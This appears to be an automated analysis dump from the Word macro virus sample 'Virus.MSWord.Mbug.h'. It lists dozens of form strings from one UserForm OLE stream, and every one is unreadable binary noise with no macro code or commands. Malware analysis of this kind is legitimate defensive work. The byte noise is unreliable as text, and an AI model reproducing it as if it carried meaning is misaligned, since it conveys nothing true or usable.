VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J����o|k^gJJRB9JB9B1)B3#)3.+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!')-!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1)BJJRiiqxcs^Rck^gwoswos[Zl')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3#)JBJcRkiiqk^gJBJ')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
XFm�wkkxcskkum�um�um�kkkkk^gkkiiqkkum��~����3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1DL���ۙ�۵��xw�ƨ棟����ƨ�̹�µ���ﵡ�޸�µ螟�JJR
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)!)9)9)%91)B)5k)5k19c)Bo19c19c)Bo4En5:k4En9I�N]�~��iu�~�ϣ�������������螟�ew�1E�FV�DL�ew�~�ϔ�ޞ�ְ��µ�����������������19c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
23#)'&D<.<999F-=BB9=-1JBBF-=JBBJ99F-=H/?���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�~��~�semxcs^RcNPTNPTB9B<.<3.+3#)3.+$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2)%93#))!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1)BJJRcZkiiqiiq^RccZkiiq^Rc3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1)BJJZk^gk^gk^gJBB
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2{�woskkum�woskkkkkkkckkkk^gk^giiqkkkk����mn
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z{{ҙ�ۙ�۵��{{�{{�ƫ͵�㙍�ƨ�޸�µ�µ�µ�̹�dt�)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)%91)B9)91991)B19c19c1-X!1k!1k19c19c4En5:k9I�N]�~�ϔ��µ����������µ赯�~��ew�ew�ew�ew�~�ϛ�Ǜ�ǵ��µ�������������������~��Xe�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
21)B3#)3.+9)9F-=999F-=BB99)9991F-=BB9?/3���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)}r�����~��o|wosk^gOGG9993#)')-!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)BBR^Rccck[ZlZKUcckk^gJJR3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)%93#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)J9J^Rck^gsema[~999')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3=Tum�xcsiiqkkum�{u~iiqk^giiqkckcckcckiiqiiq�~�ҧ�9)9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c���ƨ晍ۙ�ۙ�ۈ�أ��{{ҙ�����µ�µ�µ�µ赯�19c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)!)$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
21)B1999999991)B!1k%)o19c19c19c19c4En)BoK[�ew����̹���������൯Ⱗʰ�ʞ�֛�ǔ�ޞ�֔�ޔ�ޞ��µ�������������������~��TZ�1E�FV�3=T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)!))%99)9999BB9=-19)9F-=991F-=9999)9F-=;;3���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a[~�������~�wosk^gB9B!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
')-9)9JJRk^gkVcJJRkckkVcJBJ')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)J9J3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)%9JJRcZkiiqk^gkckkVc999
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)iiqkkkkum�um�iiqum�kkkkk^gcZkkVc[Zliiq�o�����mn
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)$3���۵��`bǰ��޸降�{{ҵ�㵡�ƨ�µ�µ�µ�µ�}��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2)!))%91)B9)999999999919J19c!1k19c)Bo19cBMk5:k9L�xw���ְ�ʞ�֞�֔�ޞ�֣�൯�µ赯ⵯⵯⵯ�µ�µ�µ���������ﵯ�dt�1E�&-�&-�.?�,4�)Bo
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
29)9<.<9)9F-=BB9F-=F-=F-==-1F-=991;+;���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
99{ܴ������xcsZKU199!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)1)BRBBPZmZKU^RcPZmJJR<.<!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B9BJJR!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!99JPZmk^gum�iiqiiqk^gZKU<<?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B9Biiqiiqum�k^g{u~um�um�iiqiiqk^gkckkkk^gkk���ܴ�3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Bxw�iu�{{ҙ�ۈ�؈�ؙ�ۈ��ƨ浯�µ����µ�޸锠�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
99)9)%91999)99999999)93=T'1Y19c)Bo19c)Bo4EnBMkK[�dt�ew�ew�iu�~�ϔ�޵��̹�µ赯�µ�������������µ�������Xe�&-�!1k&-�.3~.D�.D�1E�FV�9I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B)!)9)9991=-1B9BJBBBB9=-19)9BB9F-=999F-=;+;���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!41l������wosgZsJJR<.<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1)B<.<JJR[Zl^RcJJRJBB3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)%9XFmJBB
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!J9RgZsk^giiqiiqum�k^gcckZKU199
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
99Jxcsiiqum�um�um�kkiiqiiqk^g[ZlcZkiiqkk�o�ܴ�skc
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!.3~N]�{{҈�،��`bǈ��ƫ͙�ۈ��ƨ�µ赯�ƨ�µ�fs�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2)%9=-19999999999)99999)9!1k)5k!1k19c)Bo4EnBMk1E�DL�Xe�iu�~�����̹�̹�������������������µ谧�~��DL�1E�1E�.?�.D�.D�.D�1E�1E�Xe�iu�~��LY�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B)!)1%1999F-=<<?JBBF-=991F-=F-==-19)99)9DD;���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z����~��o|^RcJJRJBBB9B)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)%91)BJBBJJZ^Rc<<?3.D)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1)BZKUiiqJBJ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1)BOGGiiqxcscckkkk^gk^gcckiiqZKU')-)%9iiqxcsum�kk{u~kkkkcZkcckgZskVckkkk������1!!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1E���ʈ��AK�xw����{{�ƨ�{{ҙ��޸食�ƨ�µ螟�9Fc
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)!)1)B1)B999999999999999F-=99J1-X19c!1k19c4En4En9I�K[�ew�iuͣ��̹�������������������µ�~��dt�DL�FV�K[�K[�K[�K[�1E�9L�K[�Xe�~��~�����̹䛟�9I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1)!)1999)99)9RBBBB9B9B9)9F-=991F-=991999;+;���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B�o�wossem[ZlJJRN?VB9B1)B991')-)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
..9B9BJBJJJZJBJ999')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)9^Rck^gcck3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!99J[Zlwoskksemum�iiqcckk^gk^gum�BB9)%9cZkt_�xcsiiqiiqiiqcckiiqcZk[Zlkkiiq�o����ZKU
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JDL�N]�DL�1?�{{ҙ��iu͈�ص�㣟�ƨ�ƨ棟�µ�ew�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
29)9999999999999F-=9999)999J1-X!1k)5k19c.3~BMkFV�iu�~�ϵ��̹������������赯⣟�~��ew�Xe�Xe�ew�~��iu�dt�ew�~��~�ϛ�Ǜ�Ǜ�ǵ��̹����̹�ew�LY�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B)%99)9<.<B9BJBBRBBBB9F-=9999)93.+9)93.+#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!19c^Rcxcsk^g^RcOGGB9BB9B1)B<.<B9B..9)!))!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)%9BBR3=T3.D)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
')-99JJJRiiqk^g^Rc!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)%93=Tum�kkk^gkkk^gsemgZsiiq{u~kk3#)$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2iiqiiqkkkkiiqcckgZsZKUiiqiiqiiqiiq����~3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z1?�`b�cZkTZ�1?�1?����`b�ƨ浡㙍���赯ⵡ�]i�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91)B1999)99999999999)9<.<F-=B9B?9W19c!1k19c4En9L�dt�~�Ϟ�����������µ赯➟ְ�ʞ��~��~��~��~��~��~��~�ϛ�Ǟ�֞�֞��ƫ����̹�̹�������̹�{{�~��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)%91)BB9BJBBB9B9)9F-==-1F-=9)9=-1!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9)999JkVck^gJJRB9B9)91)B999B9B3#))!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
21)BB9B1)B!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)B9BJJR^RccckiiqB9J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
99J[ZlsemiiqgZsiiqkkccck^gum�wosNPT
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B9BiiqkkiiqiiqcckcckcZk[ZlZKUcckcZkkkҧ�skc)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!##XXe�1?�N]�&-�1?�xw����{{�`b�ƨ晍ۈ��̹䝊�#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
))!)$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
23#)9)9999999F-=9999)9BB9F-=B9BB9B19J)5k)5kGF�fs�]i�Xe�~��~�ϰ�ʔ��~��~�ϛ�Ǟ�֞�֛��~��~��~��~�ϔ��~�ϰ�ʰ��µ�µ�̹���������������ⵡ�~�ϵ��19J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B3#)1)BB9BB9BJBBJ99B9B9)9=-13#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)')-)%9)!)')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!=-1)%9')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
))!)99JBBRJJZcZkiiqxcsiiq199
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)BBRk^gum�k^giiqkkkkk^gk^gum�iiq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)[Zlk^gk^gum�k^gcck[ZlZKUcZkkVc[ZlcRk���ܴ�skc)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!41lDL�GF�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"~GF�AK�N]�{{�`bǙ�۵�㙍۵��ƨ�Xe�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1)%9)!)1)B9999999)99)9999F-=F-=999B9BB9J9Fc5:kdt�������dt�Xe�ew�iu�~��~��~�ϔ�ޞ�֞�֞��~�ϛ�Ǟ�֛�ǔ�ޛ�ǵ�ⵯ�������������������������~��̹�̹�'1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B)!))%91)BB9B9)9JBBJBB9)93.+!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BB/V3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)991)%9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!))%99)9?9WJJRJJRcccgZsiiqwoscck)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1)B[Zlkckkkiiqiiqwossemiiqkkwos3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3=TiiqiiqiiqkkcckcZkJJRPZmkVc[Zlcck��ҧ�ܴ�RBB1!!3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!%)o1E�99{+)�+)�&-�1?�`bǝ����㈈�ƨ浡㔠�99{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1)%9)%93#)999999999BB9F-=BB99)99)9B9BJBBBBRK[����ӻ���ޝ��DL�ew�iu�~��~�ϛ�ǔ�ް�ʔ��~�Ϟ�ֵ�➟֣�൯�̹����������������̹䵯�~��ew�iu͵�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1)%91)B<.<3.DJBBJBB<.<)!)
-------------------------------------------------------------------------------
